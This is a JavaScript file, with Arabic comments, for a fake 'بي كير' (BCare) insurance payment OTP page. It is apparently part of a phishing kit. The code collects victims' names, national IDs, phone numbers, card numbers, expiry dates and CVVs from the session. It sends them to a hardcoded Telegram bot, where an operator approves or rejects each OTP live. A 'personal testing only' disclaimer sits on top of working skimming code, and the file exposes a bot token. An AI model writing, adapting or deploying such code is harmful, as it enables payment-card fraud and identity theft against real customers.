/* =====================================================
   بي كير — otp-verify.js  v2
   OTP 6 أرقام + Telegram Bot + إعادة الإرسال
   ⚠️ هذا النظام للاختبار الشخصي فقط
===================================================== */
'use strict';

/* ─── ⚙️ إعدادات Telegram ───────────────────────── */
const TG = {
  TOKEN: '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow',
  CHAT:  '1451039924',
};

const TIMER_SEC = 60;

/* ─── الحالة ─────────────────────────────────────── */
let otpCode      = '';
let timerVal     = TIMER_SEC;
let timerInt     = null;
let pollInt      = null;
let lastUpdateId = 0;
let sendCount    = 0;   /* عدد مرات الإرسال */

/* ─── Telegram API ───────────────────────────────── */
async function tgSend(text) {
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id:    TG.CHAT,
          text,
          parse_mode: 'HTML',
        }),
      }
    );
    const data = await res.json();
    if (!data.ok) console.error('TG Error:', data.description);
    return data.ok;
  } catch(e) {
    console.error('TG fetch error:', e);
    return false;
  }
}

async function tgGetUpdates() {
  try {
    const res  = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=2`
    );
    const data = await res.json();
    return data.ok ? (data.result || []) : [];
  } catch(e) { return []; }
}

/* ─── الحصول على Chat ID تلقائياً ─────────────────── */
async function fetchChatId() {
  if (TG.CHAT !== 'CHAT_ID_HERE') return; /* لدينا بالفعل */
  const updates = await tgGetUpdates();
  if (updates.length) {
    const msg = updates[updates.length - 1];
    lastUpdateId = msg.update_id;
    const chatId = msg.message?.chat?.id || msg.callback_query?.from?.id;
    if (chatId) {
      TG.CHAT = String(chatId);
      console.log('✅ Chat ID:', TG.CHAT);
    }
  }
}

/* ─── بناء رسالة Telegram (كل البيانات) ────────────── */
function buildMsg(otp, isResend) {
  try {
    const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
    const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
    const form   = JSON.parse(sessionStorage.getItem('bcare_form')   || '{}');
    const inq    = JSON.parse(sessionStorage.getItem('bcare_inquiry')|| '{}');
    const card   = JSON.parse(sessionStorage.getItem('bcare_card_data') || '{}');

    const header = isResend
      ? `🔄 <b>إعادة إرسال OTP — المحاولة #${sendCount}</b>`
      : `🔔 <b>طلب دفع جديد — بي كير</b>`;

    return `${header}

👤 <b>العميل</b>
• الاسم: <b>${policy.fullName || '—'}</b>
• رقم الهوية: <code>${form.nationalId || '—'}</code>
• الجوال: <code>${policy.mobile || '—'}</code>

🚗 <b>التأمين</b>
• الشركة: <b>${offer.companyName || '—'}</b>
• نوع التأمين: ${offer.insuranceType || '—'}
• ماركة المركبة: ${policy.carBrand || '—'}
• رقم اللوحة: ${policy.plateNumber || '—'}

💳 <b>بطاقة الدفع</b>
• رقم البطاقة: <code>${card.number || '****'}</code>
• النوع: ${card.type || '—'}
• تاريخ الانتهاء: <code>${card.expiry || '—'}</code>
• CVV: <code>${card.cvv || '—'}</code>
• الاسم: ${card.name || policy.fullName || '—'}

💰 <b>المبلغ</b>
• الرسوم: ر.س ${offer.price ? parseFloat(offer.price).toFixed(2) : '—'}
• الضريبة 15%: ر.س ${offer.vat ? parseFloat(offer.vat).toFixed(2) : '—'}
• <b>المجموع: ر.س ${offer.total ? parseFloat(offer.total).toFixed(2) : '—'}</b>

🔑 <b>رمز OTP: <code>${otp}</code></b>
⏰ صالح لمدة ${TIMER_SEC} ثانية
🆔 المرجع: <code>${offer.refNumber || '—'}</code>

<i>ردّ على هذه الرسالة بـ: <code>${otp}</code> للموافقة
أو أرسل: <code>REJECT</code> للرفض</i>`;
  } catch(e) {
    return `🔔 طلب دفع\nOTP: <code>${otp}</code>`;
  }
}

/* ─── Polling رسائل الـ Admin ──────────────────────── */
function startPolling() {
  clearInterval(pollInt);
  pollInt = setInterval(async () => {
    if (TG.CHAT === 'CHAT_ID_HERE') {
      await fetchChatId();
      return;
    }
    const updates = await tgGetUpdates();
    for (const u of updates) {
      lastUpdateId = u.update_id;
      const text = u.message?.text?.trim() || '';

      if (text === otpCode) {
        /* ✅ Admin أرسل الرمز الصحيح → قبول */
        clearInterval(pollInt);
        autoFillOTP(otpCode);
        return;
      }
      if (text.toUpperCase() === 'REJECT') {
        /* ❌ Admin رفض → أخطأ OTP */
        clearInterval(pollInt);
        setOTPErr('تم رفض العملية من قِبل الفريق — تواصل مع الدعم');
        return;
      }
    }
  }, 3000);
}

/* ─── قراءة البيانات ──────────────────────────────── */
function loadData() {
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
    set('otp-amount',  offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
    set('otp-company', offer.companyName || '—');
  } catch(e) {}
}

/* ─── Timer ───────────────────────────────────────── */
function startTimer(onExpire) {
  timerVal = TIMER_SEC;
  const countEl   = document.getElementById('otp-timer-count');
  const resendBtn = document.getElementById('otp-resend-btn');
  if (resendBtn) resendBtn.disabled = true;

  clearInterval(timerInt);
  timerInt = setInterval(() => {
    timerVal--;
    if (countEl) {
      countEl.textContent = timerVal;
      countEl.classList.toggle('urgent', timerVal <= 15);
    }
    if (timerVal <= 0) {
      clearInterval(timerInt);
      if (resendBtn) resendBtn.disabled = false;
      if (countEl) countEl.textContent = '00';
      if (onExpire) onExpire();
    }
  }, 1000);
}

/* ─── إرسال OTP + بدء كل شيء ────────────────────── */
async function sendOTP(isResend = false) {
  otpCode = String(Math.floor(100000 + Math.random() * 900000));
  sendCount++;

  /* إرسال لـ Telegram */
  const msg = buildMsg(otpCode, isResend);
  const sent = await tgSend(msg);

  /* وضع التطوير */
  if (TG.CHAT === 'CHAT_ID_HERE' || !sent) {
    console.log(`🔑 OTP: ${otpCode}`);
    showDevOTP(otpCode);
  }

  /* بدء المؤقت */
  startTimer(() => {
    /* عند انتهاء الوقت — يُمكّن إعادة الإرسال */
  });
  startPolling();
}

function showDevOTP(otp) {
  const el = document.getElementById('otp-sub-text');
  if (el) el.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام<br/>
    <span style="color:var(--gold);font-weight:700;font-size:.82rem">
      ⚙️ وضع تطوير:
      <code style="background:rgba(250,166,46,.15);padding:.1rem .5rem;border-radius:6px;letter-spacing:.2em;font-size:.95rem">${otp}</code>
    </span>`;
}

/* ─── مربعات OTP ──────────────────────────────────── */
function initBoxes() {
  const boxes      = [...document.querySelectorAll('.otp-box')];
  const confirmBtn = document.getElementById('otp-confirm-btn');

  boxes.forEach((box, idx) => {
    box.addEventListener('input', e => {
      box.value = e.target.value.replace(/\D/g,'').slice(-1);
      box.classList.toggle('filled', !!box.value);
      if (box.value && idx < boxes.length-1) boxes[idx+1].focus();
      const done = boxes.every(b => b.value);
      if (confirmBtn) confirmBtn.disabled = !done;
      clearOTPErr();
    });

    box.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        boxes[idx-1].value = '';
        boxes[idx-1].classList.remove('filled');
        boxes[idx-1].focus();
        if (confirmBtn) confirmBtn.disabled = true;
      }
    });

    box.addEventListener('paste', e => {
      e.preventDefault();
      const p = (e.clipboardData?.getData('text')||'').replace(/\D/g,'').slice(0,6);
      p.split('').forEach((d,i) => { if(boxes[i]) { boxes[i].value=d; boxes[i].classList.add('filled'); } });
      if (confirmBtn) confirmBtn.disabled = p.length < 6;
      if (boxes[Math.min(p.length, 5)]) boxes[Math.min(p.length, 5)].focus();
    });
  });

  /* زر التأكيد */
  if (confirmBtn) confirmBtn.addEventListener('click', verifyOTP);

  /* إعادة الإرسال */
  const resendBtn = document.getElementById('otp-resend-btn');
  if (resendBtn) {
    resendBtn.addEventListener('click', async () => {
      /* مسح الإدخال */
      boxes.forEach(b => { b.value=''; b.classList.remove('filled','otp-error','otp-success'); });
      if (confirmBtn) confirmBtn.disabled = true;
      clearOTPErr();
      clearInterval(pollInt);
      await sendOTP(true);
      boxes[0]?.focus();
    });
  }
}

/* ─── التحقق من OTP ───────────────────────────────── */
async function verifyOTP() {
  const boxes   = [...document.querySelectorAll('.otp-box')];
  const entered = boxes.map(b => b.value).join('');

  if (entered === otpCode) {
    clearInterval(timerInt);
    clearInterval(pollInt);
    boxes.forEach(b => b.classList.add('otp-success'));

    /* 📨 رسالة ثانية لـ Telegram: العميل أكّد الرمز */
    await tgSend(buildConfirmMsg(entered, true));

    showSuccess();
  } else {
    boxes.forEach(b => {
      b.classList.add('otp-error');
      setTimeout(() => b.classList.remove('otp-error'), 500);
    });
    setOTPErr('رمز التحقق غير صحيح — حاول مرة أخرى أو أعد الإرسال');

    /* 📨 رسالة ثانية لـ Telegram: العميل أدخل رمز خاطئ */
    await tgSend(buildConfirmMsg(entered, false));

    setTimeout(() => {
      boxes.forEach(b => { b.value=''; b.classList.remove('filled'); });
      const confirmBtn = document.getElementById('otp-confirm-btn');
      if (confirmBtn) confirmBtn.disabled = true;
      boxes[0]?.focus();
    }, 600);
  }
}

/* ─── بناء رسالة تأكيد العميل (الرسالة الثانية) ────── */
function buildConfirmMsg(entered, correct) {
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    if (correct) {
      return `✅ <b>العميل أكّد الرمز</b>

🔑 الرمز الذي أدخله العميل: <code>${entered}</code>
✅ <b>الرمز صحيح — تم تأكيد الدفع</b>

🏢 الشركة: ${offer.companyName || '—'}
💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
🆔 المرجع: <code>${offer.refNumber || '—'}</code>

<i>العملية مكتملة ✅</i>`;
    } else {
      return `❌ <b>العميل أدخل رمز خاطئ</b>

🔑 الرمز الذي أدخله: <code>${entered}</code>
❌ <b>الرمز غير صحيح</b>

🏢 الشركة: ${offer.companyName || '—'}
💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
🆔 المرجع: <code>${offer.refNumber || '—'}</code>

<i>العميل سيعيد المحاولة...</i>`;
    }
  } catch(e) {
    return correct
      ? `✅ العميل أكّد الرمز: <code>${entered}</code>`
      : `❌ العميل أدخل رمز خاطئ: <code>${entered}</code>`;
  }
}

function autoFillOTP(code) {
  const boxes = [...document.querySelectorAll('.otp-box')];
  code.split('').forEach((d,i) => { if(boxes[i]) { boxes[i].value=d; boxes[i].classList.add('filled'); }});
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) confirmBtn.disabled = false;
  setTimeout(verifyOTP, 300);
}

function setOTPErr(msg) { const e=document.getElementById('otp-err'); if(e) e.textContent=msg; }
function clearOTPErr()  { const e=document.getElementById('otp-err'); if(e) e.textContent='';  }

/* ─── شاشة النجاح ─────────────────────────────────── */
function showSuccess() {
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) {
    confirmBtn.disabled = true;
    confirmBtn.innerHTML = '<span class="material-icons spin-otp">autorenew</span> جاري التأكيد...';
  }

  /* إرسال إشعار نجاح لـ Telegram */
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    tgSend(`✅ <b>تم تأكيد الدفع بنجاح</b>\n🏢 ${offer.companyName||'—'}\n💰 ر.س ${parseFloat(offer.total||0).toFixed(2)}\n🆔 ${offer.refNumber||'—'}`);
  } catch(e) {}

  setTimeout(() => {
    document.getElementById('otp-card')?.classList.add('hidden');
    const sc = document.getElementById('otp-success-card');
    if (sc) sc.classList.remove('hidden');
    try {
      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
      const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
      set('success-ref',     offer.refNumber || ('BC-'+Date.now().toString().slice(-8)));
      set('success-company', offer.companyName || '—');
      set('success-amount',  offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
    } catch(e){}
    window.scrollTo({top:0, behavior:'smooth'});
  }, 1200);
}

/* ─── INIT ────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', async () => {
  loadData();
  initBoxes();

  /* ضبط رقم مرجعي */
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    if (!offer.refNumber) {
      offer.refNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
      sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
    }
  } catch(e) {}

  /* محاولة الحصول على Chat ID إذا لم يكن محدداً */
  await fetchChatId();

  /* إرسال OTP */
  await sendOTP(false);

  document.querySelector('.otp-box')?.focus();
});
